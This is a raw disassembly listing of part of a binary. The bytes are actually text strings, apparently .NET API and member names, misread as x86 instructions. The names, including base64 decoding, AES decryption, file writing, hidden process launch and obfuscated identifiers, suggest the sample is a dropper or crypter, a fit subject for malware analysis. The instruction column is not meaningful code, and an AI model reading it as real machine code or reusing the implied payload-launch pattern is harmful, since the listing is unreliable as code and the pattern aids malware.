  408a13:	65 78 74             	gs js  0x408a8a
  408a16:	00 49 44             	add    %cl,0x44(%rcx)
  408a19:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%rbx),%esi
  408a20:	6c                   	insb   (%dx),(%rdi)
  408a21:	65 00 44 69 73       	add    %al,%gs:0x73(%rcx,%rbp,2)
  408a26:	70 6f                	jo     0x408a97
  408a28:	73 65                	jae    0x408a8f
  408a2a:	00 49 6e             	add    %cl,0x6e(%rcx)
  408a2d:	64 65 78 4f          	fs gs js 0x408a80
  408a31:	66 00 53 74          	data16 add %dl,0x74(%rbx)
  408a35:	72 69                	jb     0x408aa0
  408a37:	6e                   	outsb  (%rsi),(%dx)
  408a38:	67 43 6f             	rex.XB outsl (%esi),(%dx)
  408a3b:	6d                   	insl   (%dx),(%rdi)
  408a3c:	70 61                	jo     0x408a9f
  408a3e:	72 69                	jb     0x408aa9
  408a40:	73 6f                	jae    0x408ab1
  408a42:	6e                   	outsb  (%rsi),(%dx)
  408a43:	00 54 6f 53          	add    %dl,0x53(%rdi,%rbp,2)
  408a47:	74 72                	je     0x408abb
  408a49:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%rsi),%ebp
  408a50:	74 61                	je     0x408ab3
  408a52:	69 6e 73 00 6f 70 5f 	imul   $0x5f706f00,0x73(%rsi),%ebp
  408a59:	45 71 75             	rex.RB jno 0x408ad1
  408a5c:	61                   	(bad)
  408a5d:	6c                   	insb   (%dx),(%rdi)
  408a5e:	69 74 79 00 45 78 69 	imul   $0x73697845,0x0(%rcx,%rdi,2),%esi
  408a65:	73 
  408a66:	74 73                	je     0x408adb
  408a68:	00 57 72             	add    %dl,0x72(%rdi)
  408a6b:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%rbp,%riz,2),%esi
  408a72:	79 
  408a73:	74 65                	je     0x408ada
  408a75:	73 00                	jae    0x408a77
  408a77:	73 65                	jae    0x408ade
  408a79:	74 5f                	je     0x408ada
  408a7b:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
  408a82:	65 00 
  408a84:	73 65                	jae    0x408aeb
  408a86:	74 5f                	je     0x408ae7
  408a88:	57                   	push   %rdi
  408a89:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
  408a90:	79 6c                	jns    0x408afe
  408a92:	65 00 50 72          	add    %dl,%gs:0x72(%rax)
  408a96:	6f                   	outsl  (%rsi),(%dx)
  408a97:	63 65 73             	movsxd 0x73(%rbp),%esp
  408a9a:	73 57                	jae    0x408af3
  408a9c:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
  408aa3:	79 6c                	jns    0x408b11
  408aa5:	65 00 50 61          	add    %dl,%gs:0x61(%rax)
  408aa9:	74 68                	je     0x408b13
  408aab:	00 47 65             	add    %al,0x65(%rdi)
  408aae:	74 44                	je     0x408af4
  408ab0:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%rdx),%esi
  408ab7:	79 4e                	jns    0x408b07
  408ab9:	61                   	(bad)
  408aba:	6d                   	insl   (%dx),(%rdi)
  408abb:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
  408abf:	74 5f                	je     0x408b20
  408ac1:	57                   	push   %rdi
  408ac2:	6f                   	outsl  (%rsi),(%dx)
  408ac3:	72 6b                	jb     0x408b30
  408ac5:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%rsi),%ebp
  408acc:	63 74 6f 72          	movsxd 0x72(%rdi,%rbp,2),%esi
  408ad0:	79 00                	jns    0x408ad2
  408ad2:	73 65                	jae    0x408b39
  408ad4:	74 5f                	je     0x408b35
  408ad6:	43 72 65             	rex.XB jb 0x408b3e
  408ad9:	61                   	(bad)
  408ada:	74 65                	je     0x408b41
  408adc:	4e 6f                	rex.WRX outsl (%rsi),(%dx)
  408ade:	57                   	push   %rdi
  408adf:	69 6e 64 6f 77 00 50 	imul   $0x5000776f,0x64(%rsi),%ebp
  408ae6:	72 6f                	jb     0x408b57
  408ae8:	63 65 73             	movsxd 0x73(%rbp),%esp
  408aeb:	73 00                	jae    0x408aed
  408aed:	53                   	push   %rbx
  408aee:	74 61                	je     0x408b51
  408af0:	72 74                	jb     0x408b66
  408af2:	00 54 68 72          	add    %dl,0x72(%rax,%rbp,2)
  408af6:	65 61                	gs (bad)
  408af8:	64 00 53 79          	add    %dl,%fs:0x79(%rbx)
  408afc:	73 74                	jae    0x408b72
  408afe:	65 6d                	gs insl (%dx),(%rdi)
  408b00:	2e 54                	cs push %rsp
  408b02:	68 72 65 61 64       	push   $0x64616572
  408b07:	69 6e 67 00 53 6c 65 	imul   $0x656c5300,0x67(%rsi),%ebp
  408b0e:	65 70 00             	gs jo  0x408b11
  408b11:	74 72                	je     0x408b85
  408b13:	77 70                	ja     0x408b85
  408b15:	61                   	(bad)
  408b16:	65 6c                	gs insb (%dx),(%rdi)
  408b18:	70 65                	jo     0x408b7f
  408b1a:	6d                   	insl   (%dx),(%rdi)
  408b1b:	65 72 65             	gs jb  0x408b83
  408b1e:	65 67 71 77          	gs addr32 jno 0x408b99
  408b22:	71 6c                	jno    0x408b90
  408b24:	6c                   	insb   (%dx),(%rdi)
  408b25:	6d                   	insl   (%dx),(%rdi)
  408b26:	00 6b 71             	add    %ch,0x71(%rbx)
  408b29:	77 77                	ja     0x408ba2
  408b2b:	6b 6f 73 69          	imul   $0x69,0x73(%rdi),%ebp
  408b2f:	6b 66 61 61          	imul   $0x61,0x61(%rsi),%esp
  408b33:	00 45 6e             	add    %al,0x6e(%rbp)
  408b36:	63 6f 64             	movsxd 0x64(%rdi),%ebp
  408b39:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%rsi),%ebp
  408b40:	74 65                	je     0x408ba7
  408b42:	6d                   	insl   (%dx),(%rdi)
  408b43:	2e 54                	cs push %rsp
  408b45:	65 78 74             	gs js  0x408bbc
  408b48:	00 67 65             	add    %ah,0x65(%rdi)
  408b4b:	74 5f                	je     0x408bac
  408b4d:	41 53                	push   %r11
  408b4f:	43                   	rex.XB
  408b50:	49                   	rex.WB
  408b51:	49 00 43 6f          	rex.WB add %al,0x6f(%r11)
  408b55:	6e                   	outsb  (%rsi),(%dx)
  408b56:	76 65                	jbe    0x408bbd
  408b58:	72 74                	jb     0x408bce
  408b5a:	00 46 72             	add    %al,0x72(%rsi)
  408b5d:	6f                   	outsl  (%rsi),(%dx)
  408b5e:	6d                   	insl   (%dx),(%rdi)
  408b5f:	42 61                	rex.X (bad)
  408b61:	73 65                	jae    0x408bc8
  408b63:	36 34 53             	ss xor $0x53,%al
  408b66:	74 72                	je     0x408bda
  408b68:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%rsi),%ebp
  408b6f:	53                   	push   %rbx
  408b70:	74 72                	je     0x408be4
  408b72:	69 6e 67 00 78 6d 78 	imul   $0x786d7800,0x67(%rsi),%ebp
  408b79:	6c                   	insb   (%dx),(%rdi)
  408b7a:	62 66 6e 6c 6d       	(bad)
  408b7f:	71 61                	jno    0x408be2
  408b81:	63 68 6e             	movsxd 0x6e(%rax),%ebp
  408b84:	7a 64                	jp     0x408bea
  408b86:	6e                   	outsb  (%rsi),(%dx)
  408b87:	6e                   	outsb  (%rsi),(%dx)
  408b88:	70 6b                	jo     0x408bf5
  408b8a:	74 76                	je     0x408c02
  408b8c:	6b 68 00 70          	imul   $0x70,0x0(%rax),%ebp
  408b90:	78 67                	js     0x408bf9
  408b92:	63 6f 69             	movsxd 0x69(%rdi),%ebp
  408b95:	67 73 77             	addr32 jae 0x408c0f
  408b98:	77 6c                	ja     0x408c06
  408b9a:	75 67                	jne    0x408c03
  408b9c:	67 70 7a             	addr32 jo 0x408c19
  408b9f:	6f                   	outsl  (%rsi),(%dx)
  408ba0:	67 63 65 75          	movsxd 0x75(%ebp),%esp
  408ba4:	73 7a                	jae    0x408c20
  408ba6:	71 79                	jno    0x408c21
  408ba8:	71 63                	jno    0x408c0d
  408baa:	62                   	(bad)
  408bab:	68 75 7a 6f 00       	push   $0x6f7a75
  408bb0:	52                   	push   %rdx
  408bb1:	66 63 32             	movsxd (%rdx),%si
  408bb4:	38 39                	cmp    %bh,(%rcx)
  408bb6:	38 44 65 72          	cmp    %al,0x72(%rbp,%riz,2)
  408bba:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%rsi),%esi
  408bc1:	73 00                	jae    0x408bc3
  408bc3:	53                   	push   %rbx
  408bc4:	79 73                	jns    0x408c39
  408bc6:	74 65                	je     0x408c2d
  408bc8:	6d                   	insl   (%dx),(%rdi)
  408bc9:	2e 53                	cs push %rbx
  408bcb:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
  408bcf:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%rcx,%rdi,2),%esi
  408bd6:	70 
  408bd7:	74 6f                	je     0x408c48
  408bd9:	67 72 61             	addr32 jb 0x408c3d
  408bdc:	70 68                	jo     0x408c46
  408bde:	79 00                	jns    0x408be0
  408be0:	52                   	push   %rdx
  408be1:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%rdx),%ebp
  408be8:	4d 61                	rex.WRB (bad)
  408bea:	6e                   	outsb  (%rsi),(%dx)
  408beb:	61                   	(bad)
  408bec:	67 65 64 00 49 43    	gs add %cl,%fs:0x43(%ecx)
  408bf2:	72 79                	jb     0x408c6d
  408bf4:	70 74                	jo     0x408c6a
  408bf6:	6f                   	outsl  (%rsi),(%dx)
  408bf7:	54                   	push   %rsp
  408bf8:	72 61                	jb     0x408c5b
  408bfa:	6e                   	outsb  (%rsi),(%dx)
  408bfb:	73 66                	jae    0x408c63
  408bfd:	6f                   	outsl  (%rsi),(%dx)
  408bfe:	72 6d                	jb     0x408c6d
  408c00:	00 4d 65             	add    %cl,0x65(%rbp)
  408c03:	6d                   	insl   (%dx),(%rdi)
  408c04:	6f                   	outsl  (%rsi),(%dx)
  408c05:	72 79                	jb     0x408c80
  408c07:	53                   	push   %rbx
  408c08:	74 72                	je     0x408c7c
  408c0a:	65 61                	gs (bad)
  408c0c:	6d                   	insl   (%dx),(%rdi)
  408c0d:	00 43 72             	add    %al,0x72(%rbx)
  408c10:	79 70                	jns    0x408c82
  408c12:	74 6f                	je     0x408c83
  408c14:	53                   	push   %rbx
  408c15:	74 72                	je     0x408c89
  408c17:	65 61                	gs (bad)
  408c19:	6d                   	insl   (%dx),(%rdi)
  408c1a:	00 47 65             	add    %al,0x65(%rdi)
  408c1d:	74 42                	je     0x408c61
  408c1f:	79 74                	jns    0x408c95
  408c21:	65 73 00             	gs jae 0x408c24
  408c24:	53                   	push   %rbx
  408c25:	79 6d                	jns    0x408c94
  408c27:	6d                   	insl   (%dx),(%rdi)
  408c28:	65 74 72             	gs je  0x408c9d
  408c2b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%rbx),%esp
  408c32:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%rax,%rbp,2),%esi
  408c39:	74 
  408c3a:	5f                   	pop    %rdi
  408c3b:	4b                   	rex.WXB
  408c3c:	65 79 53             	gs jns 0x408c92
  408c3f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%rdx),%edi
  408c46:	5f                   	pop    %rdi
  408c47:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
  408c49:	64 65 00 43 69       	fs add %al,%gs:0x69(%rbx)
  408c4e:	70 68                	jo     0x408cb8
  408c50:	65 72 4d             	gs jb  0x408ca0
  408c53:	6f                   	outsl  (%rsi),(%dx)
  408c54:	64 65 00 44 65 72    	fs add %al,%gs:0x72(%rbp,%riz,2)
  408c5a:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%rsi),%esi
  408c61:	73 00                	jae    0x408c63
  408c63:	43 72 65             	rex.XB jb 0x408ccb
  408c66:	61                   	(bad)
  408c67:	74 65                	je     0x408cce
  408c69:	44                   	rex.R
  408c6a:	65 63 72 79          	movsxd %gs:0x79(%rdx),%esi
  408c6e:	70 74                	jo     0x408ce4
  408c70:	6f                   	outsl  (%rsi),(%dx)
  408c71:	72 00                	jb     0x408c73
  408c73:	43 72 65             	rex.XB jb 0x408cdb
  408c76:	61                   	(bad)
  408c77:	74 65                	je     0x408cde
  408c79:	45 6e                	rex.RB outsb (%rsi),(%dx)
  408c7b:	63 72 79             	movsxd 0x79(%rdx),%esi
  408c7e:	70 74                	jo     0x408cf4
  408c80:	6f                   	outsl  (%rsi),(%dx)
  408c81:	72 00                	jb     0x408c83
  408c83:	53                   	push   %rbx
  408c84:	74 72                	je     0x408cf8
  408c86:	65 61                	gs (bad)
  408c88:	6d                   	insl   (%dx),(%rdi)
  408c89:	00 43 72             	add    %al,0x72(%rbx)
  408c8c:	79 70                	jns    0x408cfe
  408c8e:	74 6f                	je     0x408cff
  408c90:	53                   	push   %rbx
  408c91:	74 72                	je     0x408d05
  408c93:	65 61                	gs (bad)
  408c95:	6d                   	insl   (%dx),(%rdi)
  408c96:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
  408c98:	64 65 00 57 72       	fs add %dl,%gs:0x72(%rdi)
  408c9d:	69 74 65 00 43 6c 6f 	imul   $0x736f6c43,0x0(%rbp,%riz,2),%esi
  408ca4:	73 
  408ca5:	65 00 54 6f 41       	add    %dl,%gs:0x41(%rdi,%rbp,2)
  408caa:	72 72                	jb     0x408d1e
  408cac:	61                   	(bad)
  408cad:	79 00                	jns    0x408caf
  408caf:	65 73 6d             	gs jae 0x408d1f
  408cb2:	79 76                	jns    0x408d2a
  408cb4:	71 72                	jno    0x408d28
  408cb6:	64 6f                	outsl  %fs:(%rsi),(%dx)
  408cb8:	77 70                	ja     0x408d2a
  408cba:	68 6e 70 74 66       	push   $0x6674706e
  408cbf:	76 6a                	jbe    0x408d2b
  408cc1:	72 74                	jb     0x408d37
  408cc3:	76 67                	jbe    0x408d2c
  408cc5:	6b 6d 6d 64          	imul   $0x64,0x6d(%rbp),%ebp
  408cc9:	7a 75                	jp     0x408d40
  408ccb:	78 00                	js     0x408ccd
  408ccd:	73 65                	jae    0x408d34
  408ccf:	74 5f                	je     0x408d30
  408cd1:	41 72 67             	rex.B jb 0x408d3b
  408cd4:	75 6d                	jne    0x408d43
  408cd6:	65 6e                	outsb  %gs:(%rsi),(%dx)
  408cd8:	74 73                	je     0x408d4d
  408cda:	00 67 65             	add    %ah,0x65(%rdi)
  408cdd:	74 5f                	je     0x408d3e
  408cdf:	53                   	push   %rbx
  408ce0:	79 73                	jns    0x408d55
  408ce2:	74 65                	je     0x408d49
  408ce4:	6d                   	insl   (%dx),(%rdi)
  408ce5:	44 69 72 65 63 74 6f 	imul   $0x726f7463,0x65(%rdx),%r14d
  408cec:	72 
  408ced:	79 00                	jns    0x408cef
  408cef:	73 65                	jae    0x408d56
  408cf1:	74 5f                	je     0x408d52
  408cf3:	55                   	push   %rbp
  408cf4:	73 65                	jae    0x408d5b
  408cf6:	53                   	push   %rbx
  408cf7:	68 65 6c 6c 45       	push   $0x456c6c65
  408cfc:	78 65                	js     0x408d63
  408cfe:	63 75 74             	movsxd 0x74(%rbp),%esi
  408d01:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
  408d05:	74 5f                	je     0x408d66
  408d07:	52                   	push   %rdx
  408d08:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%rdx),%esi
  408d0f:	53 74 
  408d11:	61                   	(bad)
  408d12:	6e                   	outsb  (%rsi),(%dx)
  408d13:	64 61                	fs (bad)
  408d15:	72 64                	jb     0x408d7b
  408d17:	4f 75 74             	rex.WRXB jne 0x408d8e
  408d1a:	70 75                	jo     0x408d91
  408d1c:	74 00                	je     0x408d1e
  408d1e:	57                   	push   %rdi
  408d1f:	61                   	(bad)
  408d20:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%rsi,%rax,2),%esi
  408d27:	69 
  408d28:	74 00                	je     0x408d2a
  408d2a:	2e 63 63 74          	cs movsxd 0x74(%rbx),%esp
  408d2e:	6f                   	outsl  (%rsi),(%dx)
  408d2f:	72 00                	jb     0x408d31
  408d31:	47                   	rex.RXB
  408d32:	65 74 46             	gs je  0x408d7b
  408d35:	6f                   	outsl  (%rsi),(%dx)
  408d36:	6c                   	insb   (%dx),(%rdi)
  408d37:	64 65 72 50          	fs gs jb 0x408d8b
  408d3b:	61                   	(bad)
  408d3c:	74 68                	je     0x408da6
  408d3e:	00 53 70             	add    %dl,0x70(%rbx)
  408d41:	65 63 69 61          	movsxd %gs:0x61(%rcx),%ebp
  408d45:	6c                   	insb   (%dx),(%rdi)
  408d46:	46 6f                	rex.RX outsl (%rsi),(%dx)
  408d48:	6c                   	insb   (%dx),(%rdi)
  408d49:	64 65 72 00          	fs gs jb 0x408d4d
  408d4d:	43 6f                	rex.XB outsl (%rsi),(%dx)
  408d4f:	6d                   	insl   (%dx),(%rdi)
  408d50:	62 69 6e 65 00       	(bad)
  408d55:	44 63 41 4a          	movsxd 0x4a(%rcx),%r8d
  408d59:	72 4f                	jb     0x408daa
  408d5b:	39 51 31             	cmp    %edx,0x31(%rcx)
  408d5e:	00 4d 6f             	add    %cl,0x6f(%rbp)
  408d61:	64 75 6c             	fs jne 0x408dd0
  408d64:	65 00 6a 41          	add    %ch,%gs:0x41(%rdx)
  408d68:	46 33 70 45          	rex.RX xor 0x45(%rax),%r14d
  408d6c:	4f                   	rex.WRXB
  408d6d:	4f                   	rex.WRXB
  408d6e:	4e 63 6c 45 61       	movslq 0x61(%rbp,%r8,2),%r13
  408d73:	00 74 79 70          	add    %dh,0x70(%rcx,%rdi,2)
  408d77:	65 6d                	gs insl (%dx),(%rdi)
  408d79:	64 74 00             	fs je  0x408d7c
  408d7c:	54                   	push   %rsp
  408d7d:	79 70                	jns    0x408def
  408d7f:	65 00 46 69          	add    %al,%gs:0x69(%rsi)
  408d83:	65 6c                	gs insb (%dx),(%rdi)
  408d85:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
  408d88:	66 6f                	outsw  (%rsi),(%dx)
  408d8a:	00 4d 65             	add    %cl,0x65(%rbp)
  408d8d:	74 68                	je     0x408df7
  408d8f:	6f                   	outsl  (%rsi),(%dx)
  408d90:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
  408d93:	66 6f                	outsw  (%rsi),(%dx)
  408d95:	00 52 65             	add    %dl,0x65(%rdx)
  408d98:	73 6f                	jae    0x408e09
  408d9a:	6c                   	insb   (%dx),(%rdi)
  408d9b:	76 65                	jbe    0x408e02
  408d9d:	54                   	push   %rsp
  408d9e:	79 70                	jns    0x408e10
  408da0:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
  408da4:	74 46                	je     0x408dec
  408da6:	69 65 6c 64 73 00 4d 	imul   $0x4d007364,0x6c(%rbp),%esp
  408dad:	65 6d                	gs insl (%dx),(%rdi)
  408daf:	62 65 72 49 6e       	(bad)
  408db4:	66 6f                	outsw  (%rsi),(%dx)
  408db6:	00 67 65             	add    %ah,0x65(%rdi)
  408db9:	74 5f                	je     0x408e1a
  408dbb:	4d                   	rex.WRB
  408dbc:	65 74 61             	gs je  0x408e20
  408dbf:	64 61                	fs (bad)
  408dc1:	74 61                	je     0x408e24
  408dc3:	54                   	push   %rsp
  408dc4:	6f                   	outsl  (%rsi),(%dx)
  408dc5:	6b 65 6e 00          	imul   $0x0,0x6e(%rbp),%esp
  408dc9:	52                   	push   %rdx
  408dca:	65 73 6f             	gs jae 0x408e3c
  408dcd:	6c                   	insb   (%dx),(%rdi)
  408dce:	76 65                	jbe    0x408e35
  408dd0:	4d                   	rex.WRB
  408dd1:	65 74 68             	gs je  0x408e3c
  408dd4:	6f                   	outsl  (%rsi),(%dx)
  408dd5:	64 00 4d 65          	add    %cl,%fs:0x65(%rbp)
  408dd9:	74 68                	je     0x408e43
  408ddb:	6f                   	outsl  (%rsi),(%dx)
  408ddc:	64 42 61             	fs rex.X (bad)
  408ddf:	73 65                	jae    0x408e46
  408de1:	00 44 65 6c          	add    %al,0x6c(%rbp,%riz,2)
  408de5:	65 67 61             	gs addr32 (bad)
  408de8:	74 65                	je     0x408e4f
  408dea:	00 43 72             	add    %al,0x72(%rbx)
  408ded:	65 61                	gs (bad)
  408def:	74 65                	je     0x408e56
  408df1:	44                   	rex.R
  408df2:	65 6c                	gs insb (%dx),(%rdi)
  408df4:	65 67 61             	gs addr32 (bad)
  408df7:	74 65                	je     0x408e5e
  408df9:	00 53 65             	add    %dl,0x65(%rbx)
  408dfc:	74 56                	je     0x408e54
  408dfe:	61                   	(bad)
  408dff:	6c                   	insb   (%dx),(%rdi)
  408e00:	75 65                	jne    0x408e67
  408e02:	00 47 65             	add    %al,0x65(%rdi)
  408e05:	74 54                	je     0x408e5b
  408e07:	79 70                	jns    0x408e79
  408e09:	65 46 72 6f          	gs rex.RX jb 0x408e7c
  408e0d:	6d                   	insl   (%dx),(%rdi)
  408e0e:	48 61                	rex.W (bad)
  408e10:	6e                   	outsb  (%rsi),(%dx)
  408e11:	64 6c                	fs insb (%dx),(%rdi)
  408e13:	65 00 52 75          	add    %dl,%gs:0x75(%rdx)
  408e17:	6e                   	outsb  (%rsi),(%dx)
  408e18:	74 69                	je     0x408e83
  408e1a:	6d                   	insl   (%dx),(%rdi)
  408e1b:	65 54                	gs push %rsp
  408e1d:	79 70                	jns    0x408e8f
  408e1f:	65 48 61             	gs rex.W (bad)
  408e22:	6e                   	outsb  (%rsi),(%dx)
  408e23:	64 6c                	fs insb (%dx),(%rdi)
  408e25:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
  408e29:	74 5f                	je     0x408e8a
  408e2b:	41 73 73             	rex.B jae 0x408ea1
  408e2e:	65 6d                	gs insl (%dx),(%rdi)
  408e30:	62 6c 79 00 41       	(bad)
  408e35:	73 73                	jae    0x408eaa
  408e37:	65 6d                	gs insl (%dx),(%rdi)
  408e39:	62 6c 79 00 67       	(bad)
  408e3e:	65 74 5f             	gs je  0x408ea0
  408e41:	4d 61                	rex.WRB (bad)
  408e43:	6e                   	outsb  (%rsi),(%dx)
  408e44:	69 66 65 73 74 4d 6f 	imul   $0x6f4d7473,0x65(%rsi),%esp
  408e4b:	64 75 6c             	fs jne 0x408eba
  408e4e:	65 00 20             	add    %ah,%gs:(%rax)
  408e51:	00 49 6e             	add    %cl,0x6e(%rcx)
  408e54:	74 50                	je     0x408ea6
  408e56:	74 72                	je     0x408eca
  408e58:	00 49 6e             	add    %cl,0x6e(%rcx)
  408e5b:	76 6f                	jbe    0x408ecc
  408e5d:	6b 65 00 6f          	imul   $0x6f,0x0(%rbp),%esp
  408e61:	00 42 65             	add    %al,0x65(%rdx)
  408e64:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%esi),%ebp
  408e6b:	6b 
  408e6c:	65 00 49 41          	add    %cl,%gs:0x41(%rcx)
  408e70:	73 79                	jae    0x408eeb
  408e72:	6e                   	outsb  (%rsi),(%dx)
  408e73:	63 52 65             	movsxd 0x65(%rdx),%edx
  408e76:	73 75                	jae    0x408eed
  408e78:	6c                   	insb   (%dx),(%rdi)
  408e79:	74 00                	je     0x408e7b
  408e7b:	41 73 79             	rex.B jae 0x408ef7
  408e7e:	6e                   	outsb  (%rsi),(%dx)
  408e7f:	63 43 61             	movsxd 0x61(%rbx),%eax
  408e82:	6c                   	insb   (%dx),(%rdi)
  408e83:	6c                   	insb   (%dx),(%rdi)
  408e84:	62 61 63 6b 00       	(bad)
  408e89:	63 61 6c             	movsxd 0x6c(%rcx),%esp
  408e8c:	6c                   	insb   (%dx),(%rdi)
  408e8d:	62 61 63 6b 00       	(bad)
  408e92:	6f                   	outsl  (%rsi),(%dx)
  408e93:	62 6a 65 63 74       	(bad)
  408e98:	00 45 6e             	add    %al,0x6e(%rbp)
  408e9b:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
  408e9e:	76 6f                	jbe    0x408f0f
  408ea0:	6b 65 00 72          	imul   $0x72,0x0(%rbp),%esp
  408ea4:	65 73 75             	gs jae 0x408f1c
  408ea7:	6c                   	insb   (%dx),(%rdi)
  408ea8:	74 00                	je     0x408eaa
  408eaa:	45 35 64 62 6a 51    	rex.RB xor $0x516a6264,%eax
  408eb0:	42                   	rex.X
  408eb1:	4d                   	rex.WRB
  408eb2:	4e 00 59 35          	rex.WRX add %r11b,0x35(%rcx)
  408eb6:	70 66                	jo     0x408f1e
  408eb8:	70 61                	jo     0x408f1b
  408eba:	43                   	rex.XB
  408ebb:	4d 70 00             	rex.WRB jo 0x408ebe
  408ebe:	42                   	rex.X
  408ebf:	66 5a                	pop    %dx
  408ec1:	54                   	push   %rsp
  408ec2:	52                   	push   %rdx
  408ec3:	4d                   	rex.WRB
  408ec4:	67 6c                	insb   (%dx),(%edi)
  408ec6:	50                   	push   %rax
  408ec7:	00 6f 63             	add    %ch,0x63(%rdi)
  408eca:	69 73 62 47 64 46 70 	imul   $0x70466447,0x62(%rbx),%esi
  408ed1:	00 76 57             	add    %dh,0x57(%rsi)
  408ed4:	63 48 52             	movsxd 0x52(%rax),%ecx
  408ed7:	6e                   	outsb  (%rsi),(%dx)
  408ed8:	41 6a 5a             	rex.B push $0x5a
  408edb:	00 73 42             	add    %dh,0x42(%rbx)
  408ede:	6a 61                	push   $0x61
  408ee0:	42 31 54 4f 44       	xor    %edx,0x44(%rdi,%r9,2)
  408ee5:	00 79 56             	add    %bh,0x56(%rcx)
  408ee8:	4b                   	rex.WXB
  408ee9:	65 73 56             	gs jae 0x408f42
  408eec:	72 4b                	jb     0x408f39
  408eee:	69 00 67 69 4e 34    	imul   $0x344e6967,(%rax),%eax
  408ef4:	52                   	push   %rdx
  408ef5:	32 5a 49             	xor    0x49(%rdx),%bl
  408ef8:	4a 00 6e 41          	rex.WX add %bpl,0x41(%rsi)
  408efc:	59                   	pop    %rcx
  408efd:	74 59                	je     0x408f58
  408eff:	77 41                	ja     0x408f42
  408f01:	52                   	push   %rdx
  408f02:	67 00 42 41          	add    %al,0x41(%edx)
  408f06:	47 5a                	rex.RXB pop %r10
  408f08:	75 70                	jne    0x408f7a
  408f0a:	6b 77 4f 00          	imul   $0x0,0x4f(%rdi),%esi
  408f0e:	49                   	rex.WB
  408f0f:	65 69 35 5a 66 75 57 	imul   $0x6a480070,%gs:0x5775665a(%rip),%esi        # 0x57b5f574
  408f16:	70 00 48 6a 
  408f1a:	59                   	pop    %rcx
  408f1b:	77 46                	ja     0x408f63
  408f1d:	66 52                	push   %dx
  408f1f:	31 4a 00             	xor    %ecx,0x0(%rdx)
  408f22:	57                   	push   %rdi
  408f23:	51                   	push   %rcx
  408f24:	6b 41 4e 30          	imul   $0x30,0x4e(%rcx),%eax
  408f28:	42                   	rex.X
  408f29:	4f 6e                	rex.WRXB outsb (%rsi),(%dx)
  408f2b:	00 53 6f             	add    %dl,0x6f(%rbx)
  408f2e:	72 74                	jb     0x408fa4
  408f30:	65 64 4c 69 73 74 00 	gs imul $0x73795300,%fs:0x74(%rbx),%r14
  408f37:	53 79 73 
  408f3a:	74 65                	je     0x408fa1
  408f3c:	6d                   	insl   (%dx),(%rdi)
  408f3d:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
  408f40:	6c                   	insb   (%dx),(%rdi)
  408f41:	6c                   	insb   (%dx),(%rdi)
  408f42:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
  408f47:	6e                   	outsb  (%rsi),(%dx)
  408f48:	73 00                	jae    0x408f4a
  408f4a:	4e                   	rex.WRX
  408f4b:	66 62 55 42 62 32    	(bad)
  408f51:	63 58 00             	movsxd 0x0(%rax),%ebx
  408f54:	4e 63 55 44          	rex.WRX movslq 0x44(%rbp),%r10
  408f58:	53                   	push   %rbx
  408f59:	62 6c 6f 76 00       	(bad)
  408f5e:	7a 78                	jp     0x408fd8
  408f60:	36 6e                	ss outsb (%rsi),(%dx)
  408f62:	43 56                	rex.XB push %r14
  408f64:	31 73 47             	xor    %esi,0x47(%rbx)
  408f67:	00 4f 5a             	add    %cl,0x5a(%rdi)
  408f6a:	76 4c                	jbe    0x408fb8
  408f6c:	70 33                	jo     0x408fa1
  408f6e:	62                   	(bad)
  408f6f:	30 4e 00             	xor    %cl,0x0(%rsi)
  408f72:	6e                   	outsb  (%rsi),(%dx)
  408f73:	6f                   	outsl  (%rsi),(%dx)
  408f74:	4d 50                	rex.WRB push %r8
  408f76:	67 31 79 44          	xor    %edi,0x44(%ecx)
  408f7a:	66 00 48 61          	data16 add %cl,0x61(%rax)
  408f7e:	73 68                	jae    0x408fe8
  408f80:	74 61                	je     0x408fe3
  408f82:	62 6c 65 00 4f       	(bad)
  408f87:	47 6d                	rex.RXB insl (%dx),(%rdi)
  408f89:	37                   	(bad)
  408f8a:	52                   	push   %rdx
  408f8b:	34 34                	xor    $0x34,%al
  408f8d:	72 62                	jb     0x408ff1
  408f8f:	00 63 79             	add    %ah,0x79(%rbx)
  408f92:	47 52                	rex.RXB push %r10
  408f94:	54                   	push   %rsp
  408f95:	4a 32 35 46 00 50 35 	rex.WX xor 0x35500046(%rip),%sil        # 0x35908fe2
  408f9c:	78 45                	js     0x408fe3
  408f9e:	4e 6f                	rex.WRX outsl (%rsi),(%dx)
  408fa0:	57                   	push   %rdi
  408fa1:	43 6c                	rex.XB insb (%dx),(%rdi)
  408fa3:	00 49 6e             	add    %cl,0x6e(%rcx)
  408fa6:	74 36                	je     0x408fde
  408fa8:	34 00                	xor    $0x0,%al
  408faa:	49                   	rex.WB
  408fab:	41 53                	push   %r11
  408fad:	49                   	rex.WB
  408fae:	66 45                	data16 rex.RB
